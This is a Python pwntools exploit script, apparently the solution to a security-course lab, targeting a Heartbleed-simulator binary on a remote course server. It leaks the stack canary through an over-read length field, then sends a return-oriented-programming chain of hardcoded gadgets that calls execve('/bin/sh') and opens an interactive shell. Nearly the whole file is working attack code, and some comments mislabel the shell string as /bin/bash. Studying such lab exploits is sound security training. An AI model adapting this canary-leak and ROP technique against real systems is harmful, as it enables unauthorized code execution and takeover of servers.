''' Script Module Importing '''
from pwn import *

context.arch = "x86_64"                         # Set Exploit Architecture to x86_64

''' Constant Initializing '''
FORCE_RETURN = b'0:'                            # Set Length to 0 to Force Program Return
BUFF_FILL = b'A' * 1024	                        # Set Buffer Filler
RBP_FILL = b'B'*8                               # Set RBP Filler

POP_RAX = p64(0x0451fd7)                        # Set Gadget 1: pop rax; ret
MOV_RDI_RSI = p64(0x048dc5e)                    # Set Gadget 2: mov rdi, rsi
POP_RSI = p64(0x040f30e)                        # Set Gadget 3: pop rsi; ret
POP_RDX = p64(0x04017ef)                        # Set Gadget 4: pop rdx; ret

SYS_EXECVE = p64(59)                            # Set Sys Call 1: execve (59)
SHELL_FILE = p64(0x68732f6e69622f)              # Set execve() filename: /bin/bash/
EXECVE_ARGV = p64(0)                            # Set execve() argv: null (0)
EXECVE_ENVP = p64(0)                            # Set execve() envp: null (0)
SYS_CALL = p64(0x4012e3)                        # Set Sys Call address


''' Establish Connection '''
p = remote("csc748.hostbin.org", 7043)          # Test Script Against Server
# p = process("./4-3_lab.bin")                  # Test Script Locally
# p = gdb.debug("./4-3_lab.bin")                # Debug with GDB


''' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Step 1 : Determine Cookie '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' '''

''' Read in Program Output '''
a = p.readuntil(b'.\n')
# Contents:
#   Heartbleed Bug Simulator (CVE-2014-0160)
#   info: https://heartbleed.com/
#   Waiting for heart beat request...
#

''' Send Payload to Leak Cookie '''
cookie_payload = "1040:99999999"                # length:data
p.sendline(cookie_payload)                      # Send First Payload

''' Read in Program Response '''
a = p.readuntil(b'.\n')
# Contents:
#   Sending heart beat response...

''' Save Leaked Data '''
leaked_data = p.readuntil(b'\nWaiting')                 # Read until Next Response
leaked_data = leaked_data.replace(b'\nWaiting', b'')    # Remove Next Response from Data

''' Extract Cookie from Leaked Data '''
u = make_unpacker(64,
                  endian='little',
                  sign='unsigned')              # Create Unpacker

cookie_bytes = leaked_data[-8:]                 # Extract Cookie Bytes from Leaked Data
cookie_dec = u(cookie_bytes)                    # Convert to Decimal
cookie_hex = hex(cookie_dec)                    # Convert to Hex String

print('-' * 20 +
      f"\nCookie (bytes): {cookie_bytes}\n"
      f"Cookie (decimal): {cookie_dec}\n"
      f"Cookie (hexadecimal): {cookie_hex}\n"
      + '-' * 20)                               # Print Cookie Information to Terminal


''' ' ' ' ' ' ' ' ' '''
''' Step 2: Exploit '''
''' ' ' ' ' ' ' ' ' '''

''' Read in Program Response '''
a = p.readuntil(b'.\n')
# Contents:
#   for heart beat request...

''' Prepare Payload '''
#
# Payload Format:
#
#   - - - - - - - - - - - - - - - - - - - - - - - Cookie Placement - - - - - - - - - - - - - - - - - - - - - - - -
#   FORCE_RETURN:   Null Value (0) to force program return
#   SHELL_FILE:     sys_execve() file parameter: "/bin/bash" in hexadecimal (0x68732f6e69622f)
#   BUFF_FILL:      Fills the buffer with 1024 bytes (Buffer Size - Shell_File Size)
#   cookie_bytes:   Found cookie/canary to place back on the stack
#   RBP_FILL:       Fills RBP value between cookie and return address
#
#   - - - - - - - - - - - - - - - - - - - - - - - - - ROP Chain - - - - - - - - - - - - - - - - - - - - - - - - - -
#   MOV_RDI_RSI:    Pointer to 'mov rdi, rsi' gadget to copy '/bin/sh' from RSI to RDI for execve() file parameter
#
#   POP_RAX:        Pointer to 'pop rax; ret' gadget to load '59' (SYS_EXECVE) into RAX register for syscall
#   SYS_EXECVE:     Contains syscall number (59) for the sys_execve syscall (64-bit)
#
#   POP_RSI:        Pointer to 'pop rsi; ret' gadget to load '0' into RSI register for execve() argv
#   EXECVE_ARGV:    Null Value (0) for use as argv parameter in sys_execve()
#
#   POP_RDX:        Pointer to 'pop rdx; ret' gadget to load '0' into RDX register for execve() envp
#   EXECVE_ENVP:    Null Value (0) for use as envp parameter in sys_execve()
#
#   SYS_CALL:       Pointer to 'syscall' to execute sys_execve()

payload = FORCE_RETURN + \
          SHELL_FILE + \
          BUFF_FILL + \
          cookie_bytes + \
          RBP_FILL + \
          MOV_RDI_RSI + \
          POP_RAX + \
          SYS_EXECVE + \
          POP_RSI + \
          EXECVE_ARGV + \
          POP_RDX + \
          EXECVE_ENVP + \
          SYS_CALL


''' Send ROP Chain Payload '''
p.sendline(payload)         # Send the Payload

''' Exploit Server '''
p.interactive()             # Start Interactive Session


